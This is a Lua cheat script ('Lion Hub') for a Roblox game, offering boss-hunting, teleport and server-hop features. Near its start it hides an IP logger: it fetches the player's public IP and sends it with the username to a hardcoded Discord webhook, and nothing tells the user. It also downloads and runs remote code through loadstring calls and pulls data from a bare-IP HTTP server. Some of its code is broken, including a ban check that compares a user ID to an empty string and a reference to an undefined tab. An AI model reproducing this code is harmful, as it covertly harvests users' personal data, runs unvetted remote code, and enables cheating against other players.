_G.SelectWeapon = "Melee"
loadstring(game:HttpGet("https://raw.githubusercontent.com/khoanguyen-dev1/scriptnotify/refs/heads/main/fastattack.lua"))()

repeat wait() until game:IsLoaded()
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end

game.StarterGui:SetCore("SendNotification", {
    Title = "Lion hub - Notify",
    Icon = "rbxassetid://123709024751036",
    Text = "Waiting load...",
    Duration = 5
})

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    request({
        Url = Url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(message)
    })
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    return {
        ["embeds"] = {{
            ["title"] = "**Duck Hub**",
            ["type"] = "rich",
            ["color"] = randomColor,
            ["fields"] = {
                {
                    ["name"] = "**Username**",
                    ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = "**IP Address**",
                    ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                    ["inline"] = false
                },
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
        }}
    }
end

PostWebhook("https://discord.com/api/webhooks/1358380620862197830/1igzyRnsm9u1vFzCGMhN54fJVgVl3gc6UQG4Jtk3tvcWQ7qUwKPnQXtNf4L5WaEsW6DK", AdminLoggerMsg())

require(game.ReplicatedStorage.Util.CameraShaker):Stop()

local function checkAndKickPlayer()
    local player = game:GetService("Players").LocalPlayer
    local bannedHWID = ""
    if player.UserId == bannedHWID then
        player:Kick("Ngu")
    end
end

checkAndKickPlayer()

if not game:IsLoaded() then game.Loaded:Wait() end
local HttpService = game:GetService("HttpService")

-- Fluent UI
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local Window = Fluent:CreateWindow({
    Title = "Lion Hub",
    SubTitle = "By UwU ( Lion hub ) - khoanguyen0306#0",
    TabWidth = 110,
    Size = UDim2.fromOffset(480, 320),
    Acrylic = false,
    Theme = "Yellow",
    MinimizeKey = Enum.KeyCode.End
})

local Tabs = {
    Fullmoon = Window:AddTab({ Title = "Full Moon", Icon = "" }),
    mirage = Window:AddTab({ Title = "Mirage island", Icon = "" }),
    Bigmom = Window:AddTab({ Title = "Bigmom", Icon = "" }),
    Cursed = Window:AddTab({ Title = "Cursed captain", Icon = "" }),
    katav1 = Window:AddTab({ Title = "Cake Prince", Icon = "" }),
    BossCheck = Window:AddTab({ Title = "Boss Check", Icon = "" }),
    tp = Window:AddTab({ Title = "Teleport", Icon = "" }),
}

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local ImageButton = Instance.new("ImageButton")
ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.12, 0, 0.095, 0)
ImageButton.Size = UDim2.new(0, 50, 0, 50)
ImageButton.Draggable = true
ImageButton.Image = "rbxthumb://type=GamePass&id=944258394&w=150&h=150"

local UICorner = Instance.new("UICorner", ImageButton)
UICorner.CornerRadius = UDim.new(0, 10)

ImageButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
end)

local function playSound()
    local sound = Instance.new("Sound", game:GetService("CoreGui"))
    sound.SoundId = "rbxassetid://130785805"
    sound.Volume = 10
    sound:Play()
end

playSound()


local function base64decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1,8 do c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local function xor_deobfuscate(data, key)
    local result = {}
    for i = 1, #data do
        local keyByte = key:byte((i - 1) % #key + 1)
        local dataByte = data:byte(i)
        table.insert(result, string.char(bit32.bxor(dataByte, keyByte)))
    end
    return table.concat(result)
end

local function getDeobfuscatedJobIds(apiUrl)
    local response = syn and syn.request or http and http.request or request
    local res = response({
        Url = apiUrl,
        Method = "GET"
    })

    local data = HttpService:JSONDecode(res.Body)
    local jobTable = data["jobId"]
    local result = {}
    local key = "lionsextoy"

    for obfKey, jobId in pairs(jobTable) do
        local b64 = string.split(obfKey, "_")[2]
        local decoded = base64decode(b64)
        local deobf = xor_deobfuscate(decoded, key)
        result[deobf] = jobId
    end

    return result
end

local function createJobButtons(tab, apiUrl, bossName)
    local jobList = getDeobfuscatedJobIds(apiUrl)
    local TeleportService = game:GetService("TeleportService")
    local LocalPlayer = game:GetService("Players").LocalPlayer

    for name, jobId in pairs(jobList) do
        tab:AddButton({
            Title = bossName,
            Description = "Job id: " .. name,
            Callback = function()
                TeleportService:TeleportToPlaceInstance(game.PlaceId, name, LocalPlayer)
            end
        })
    end
end

createJobButtons(Tabs.Fullmoon, "http://103.65.235.97:5000/fullmoon", "Full Moon")
createJobButtons(Tabs.mirage, "http://103.65.235.97:5000/mirage", "Mirage Island")
createJobButtons(Tabs.Bigmom, "http://103.65.235.97:5000/bigmom", "Bigmom")
createJobButtons(Tabs.Cursed, "http://103.65.235.97:5000/cursed", "Cursed Captain")
createJobButtons(Tabs.katav1, "http://103.65.235.97:5000/katav1", "Cake Prince")

game.StarterGui:SetCore("SendNotification", {
    Title = "Lion hub",
    Icon = "rbxassetid://123709024751036",
    Text = "Load Complete",
    Duration = 5
})
function topos(Pos)
    local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    local Speed = 350  -- Default speed
    if Distance < 250 then
        Speed = 350
    elseif Distance >= 1000 then
        Speed = 350
    end

    local tween_s = game:GetService("TweenService")
    local info = TweenInfo.new(
        (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude / Speed,
        Enum.EasingStyle.Linear
    )
    local tween = tween_s:Create(
        game.Players.LocalPlayer.Character.HumanoidRootPart,
        info, 
        {CFrame = Pos}
    )
    tween:Play()
    tween.Completed:Wait()
end

function AutoHaki()
    if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso")
    end
end

local meleeList = {
    "Combat", "Black Leg", "Electro", "Fishman Karate", "Dragon Claw",
    "Superhuman", "Death Step", "Sharkman Karate", "Electric Claw", 
    "Dragon Talon", "Godhuman", "Sanguine Art"
}

local function isMeleeWeapon(toolName)
    for _, name in ipairs(meleeList) do
        if toolName == name then
            return true
        end
    end
    return false
end

function EquipWeapon(ToolSe)
    if not ToolSe then return end
    if not isMeleeWeapon(ToolSe) then
        print("Tool " .. ToolSe .. " không phải melee weapon, bỏ qua!")
        return
    end

    local player = game.Players.LocalPlayer
    local backpack = player.Backpack
    local tool = backpack:FindFirstChild(ToolSe)
    if tool and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid:EquipTool(tool)
        print("✅ Equipped melee:", ToolSe)
    end
end

task.spawn(function()
    while true do
        if _G.SelectWeapon == "Melee" then
            local player = game.Players.LocalPlayer
            local backpack = player.Backpack

            for _, tool in ipairs(backpack:GetChildren()) do
                if tool:IsA("Tool") and isMeleeWeapon(tool.Name) then
                    EquipWeapon(tool.Name)
                    break
                end
            end
        end
        task.wait(0.1) -- kiểm tra mỗi 1 giây
    end
end)

-- Check boss Sea 3
function CheckBoss(name)
    local targets = typeof(name) == "table" and name or {name}
    for _, v in pairs(game.ReplicatedStorage:GetChildren()) do
        if v:IsA("Model") and table.find(targets, v.Name) and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
            return v
        end
    end
    for _, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if v:IsA("Model") and table.find(targets, v.Name) and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
            return v
        end
    end
    return nil
end

function KillBoss(boss)
    local B = CheckBoss(boss)
    if B then
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")

        local platform = Instance.new("Part")
        platform.Size = Vector3.new(6, 1, 6)
        platform.Anchored = true
        platform.CanCollide = true
        platform.Material = Enum.Material.WoodPlanks
        platform.Transparency = 1
        platform.Name = "FlyingPlatform"

        -- Tạo platform ở vị trí cao trước khi tới boss
        local startPos = hrp.Position + Vector3.new(0, 20, 0)
        platform.CFrame = CFrame.new(startPos)
        platform.Parent = workspace

        wait(0.2) -- chờ một chút để đảm bảo nhân vật đã đứng yên

        repeat
            wait(0.1)
            pcall(function()
                EquipWeapon(_G.SelectWeapon)

                -- Bay tới boss từ platform
                topos(B.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0))

                -- Cập nhật vị trí platform theo người chơi
                if platform and platform.Parent then
                    platform.CFrame = CFrame.new(hrp.Position.X, hrp.Position.Y - 3.5, hrp.Position.Z)
                end
            end)
        until not B.Parent or B.Humanoid.Health <= 0

        -- Xóa platform sau khi boss bị tiêu diệt
        if platform and platform.Parent then
            platform:Destroy()
        end
    else
        game.StarterGui:SetCore("SendNotification", {
            Title = "Lion Hub",
            Text = "Boss " .. boss .. " không có trong map!",
            Duration = 3
        })
    end
end


local bossListSea3 = {
    "Stone",
    "Hydra Leader",
    "Kilo Admiral",
    "Captain Elephant",
    "Longma",
    "Dough King",
    "Tyrant of the Skies",
    "Cake Prince",
    "Cake Queen"
}


local bossButtons = {} -- Lưu các button để xoá sau
local updatingBosses = false -- Đảm bảo không chạy trùng vòng lặp

local function clearBossButtons()
    for _, btn in ipairs(bossButtons) do
        pcall(function()
            btn:Destroy()
        end)
    end
    table.clear(bossButtons)
end

local bossButtons = {} -- Lưu các button theo tên boss
local updatingBosses = false

local function autoCheckBosses(tab)
    if not tab then 
        warn("BossCheck tab is nil!")
        return 
    end

    if updatingBosses then return end
    updatingBosses = true

    -- Tạo mỗi boss một button duy nhất
    for _, bossName in ipairs(bossListSea3) do
        local found = CheckBoss(bossName)
        local icon = found and "✅" or "❌"

        local button = tab:AddButton({
            Title = icon .. " " .. bossName,
            Description = found and "Boss có trong map - Click để đánh" or "Boss không có",
            Callback = function()
                local msg = found and ("Đang bay tới " .. bossName .. "...") or (bossName .. " không có trong map!")
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Lion Hub",
                    Text = msg,
                    Duration = 3
                })
                if found then
                    KillBoss(bossName)
                end
            end
        })

        bossButtons[bossName] = button
    end

    -- Cập nhật trạng thái icon và mô tả mỗi 10 giây
    while true do
        for _, bossName in ipairs(bossListSea3) do
            local found = CheckBoss(bossName)
            local icon = found and "✅" or "❌"
            local button = bossButtons[bossName]

            if button then
                pcall(function()
                    -- Cập nhật tiêu đề và mô tả nếu có thay đổi
                    button:SetTitle(icon .. " " .. bossName)
                    button:SetDescription(found and "Boss có trong map - Click để đánh" or "Boss không có")
                end)
            end
        end

        task.wait(10)
    end
end

autoCheckBosses(Tabs.BossCheck)

Tabs.tp:AddButton({
	Title = "Teleport Sea 1",
	Description = "faster teleport to old world with 1 click",
	Callback = function()            
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelMain")
	end
})

Tabs.tp:AddButton({
	Title = "Teleport Sea 2",
	Description = "faster teleport to new world with 1 click",
	Callback = function()            
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
	end
})
Tabs.tp:AddButton({
	Title = "Teleport Sea 3",
	Description = "faster teleport to third world with 1 click",
	Callback = function()            
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelZou")
	end
})

local Mastery = Tabs.Tele:AddSection("Dịch Chuyển Đảo")

Tabs.tp:AddButton({
    Title = "🔍 Teleport to Mirage (Once)",
    Description = "Tìm và dịch chuyển đến Mirage Island nếu có",
    Callback = function()
        local found = false
        for _, island in pairs(game:GetService("Workspace")._WorldOrigin.Locations:GetChildren()) do
            if island.Name == "Mirage Island" then
                found = true
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Lion Hub",
                    Text = "Đang dịch chuyển đến Mirage Island...",
                    Duration = 3
                })
                -- Dịch chuyển người chơi
                topos(island.CFrame * CFrame.new(0, 333, 0))

                -- Kiểm tra nếu đảo Mirage có phần để gắn BillboardGui
                -- Mình giả sử đảo đó là một Model, ta sẽ gắn BillboardGui lên một PrimaryPart hoặc một Part có tên "Base" hoặc "Main"
                local targetPart = island.PrimaryPart or island:FindFirstChildWhichIsA("BasePart")
                if targetPart then
                    -- Tạo BillboardGui
                    local billboard = Instance.new("BillboardGui")
                    billboard.Name = "MirageLabel"
                    billboard.Adornee = targetPart
                    billboard.Size = UDim2.new(0, 100, 0, 50)
                    billboard.StudsOffset = Vector3.new(0, 5, 0)
                    billboard.AlwaysOnTop = true

                    local textLabel = Instance.new("TextLabel")
                    textLabel.Parent = billboard
                    textLabel.Size = UDim2.new(1, 0, 1, 0)
                    textLabel.BackgroundTransparency = 1
                    textLabel.Text = "Mirage"
                    textLabel.TextColor3 = Color3.fromRGB(255, 255, 0) -- màu vàng
                    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
                    textLabel.TextStrokeTransparency = 0
                    textLabel.Font = Enum.Font.SourceSansBold
                    textLabel.TextScaled = true

                    billboard.Parent = targetPart
                end

                return
            end
        end

        if not found then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Lion Hub",
                Text = "Không tìm thấy Mirage Island!",
                Duration = 3
            })
        end
    end
})

AutoHaki()
